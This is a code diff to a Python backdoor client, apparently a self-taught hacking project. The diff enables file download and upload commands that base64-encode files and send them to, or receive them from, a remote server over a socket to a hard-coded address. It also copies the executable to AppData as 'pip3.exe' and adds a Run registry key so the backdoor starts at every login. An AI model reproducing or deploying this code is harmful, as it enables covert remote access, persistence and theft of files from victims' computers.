@@ -14,7 +14,11 @@ import base64
 
 # Global variables
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-IP_ADDRESS = '192.168.31.138'
+# If you're trying to bind your socket to Public IP
+# you're crossing the boundary of Ethical Hacking ;)
+# FBI is watching you :D
+IP_ADDRESS = '192.168.31.127'
+#IP_ADDRESS = '127.0.0.1'
 port = 54321
 
 # Passing 'data' as arg
@@ -43,10 +47,13 @@ def reliable_recv():
             # type(decoded_json) = str
             return decoded_json
             
-        except ValueError:
+        except ValueError as e:
             # If we get ValueError
             # Will go over reliable_recv() over & over
+            # ******
             continue
+            # ******
+            #reliable_recv()
 
 # Attempt to force a re-connection every 20 seconds
 # Listen to mouse movement double-clicks to re-connect
@@ -90,13 +97,14 @@ def shell():
                 os.chdir(command[3:])
             except:
                 continue
+            
             # server.py needs this code as well
             
             # except Exception as e:
             #     cd_error = f'[!!] Cannot cd to this PATH: {str(e)}'
             #     continue
             
-            
+        #=================================================
         # 'download' command
         # For Downloading files from Backdoor Client => Backdoor Server
         # filePath starts from 9th CHAR 'download '
@@ -104,27 +112,29 @@ def shell():
             # Start reading from first 9 CHAR as fileName
             # Encode file with ascii before sending
             
-        # elif command[:8].strip() == 'download':
-        #     file_path = command[9:].strip()
-        #     if os.path.exists(file_path):
-        #         #with open(command[9:].strip(), 'rb') as file:
-        #         with open(file_path, 'rb') as file:
-        #             # type(file) = _io.BufferedReader
-        #             file_read = file.read()
-        #             # type(file_read) = byte
-        #             file_b64encode = base64.b64encode(file_read)
-        #             # type(file_b64encode) = byte
-        #             reliable_send(file_b64encode)
+        elif command[:8].strip() == 'download':
+            file_path = command[9:].strip()
+            if os.path.exists(file_path):
+                #with open(command[9:].strip(), 'rb') as file:
+                with open(file_path, 'rb') as file:
+                    # type(file) = _io.BufferedReader
+                    file_read = file.read()
+                    # type(file_read) = byte
+                    file_b64encode = base64.b64encode(file_read)
+                    # type(file_b64encode) = byte
+                    reliable_send(file_b64encode)
+        #=================================================
         
-        # # 'upload' command
-        # elif command[:6].strip() == 'upload':
-        #     #with open(command[7:].strip(), 'wb') as fin:
-        #     with open(command[7:], 'wb') as fin:
-        #         result = reliable_recv()
-        #         result_b64decode = base64.b64decode(result)
-        #         fin.write(result_b64decode)
+        #=================================================
+        # 'upload' command
+        elif command[:6].strip() == 'upload':
+            #with open(command[7:].strip(), 'wb') as fin:
+            with open(command[7:], 'wb') as fin:
+                result = reliable_recv()
+                result_b64decode = base64.b64decode(result)
+                fin.write(result_b64decode)
+        #=================================================
                 
-                        
         else:
             try:
                 #message_back = input(f'Type Message to send to Server: ')
@@ -144,16 +154,17 @@ def shell():
 location = os.environ["appdata"] + "\\pip3.exe"
 
 # If 'location' does NOT exist, it's 1st time running this Backdoor client
+
 if not os.path.exists(location):
-    # Performing copying action of our Backdoor.exe to User's /AppData
-    shutil.copyfile(sys.executable, location)
-    # Allow users to proactively connect to our backdoor server
-    # whenever they login to their machines
-    #
-    # Appending machine startup .exe permissions to Victims' Windows regkey at
-    # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
-    # /v = Name; /t = Type; /d = Data
-    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v pip3 /t REG_SZ /d "' + location + '"', shell=True)
+#     # Performing copying action of our Backdoor.exe to User's /AppData
+      shutil.copyfile(sys.executable, location)
+#     # Allow users to proactively connect to our backdoor server
+#     # whenever they login to their machines
+#     #
+#     # Appending machine startup .exe permissions to Victims' Windows regkey at
+#     # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+#     # /v = Name; /t = Type; /d = Data
+      subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v pip3 /t REG_SZ /d "' + location + '"', shell=True)
 else:
     # Otherwise, just jump to steps below
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -168,3 +179,7 @@ else:
     #answer = "Server: Hello Back!"
     #sock.send(answer.encode())
     sock.close()
+    
+# sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+# connection()
+# sock.close()
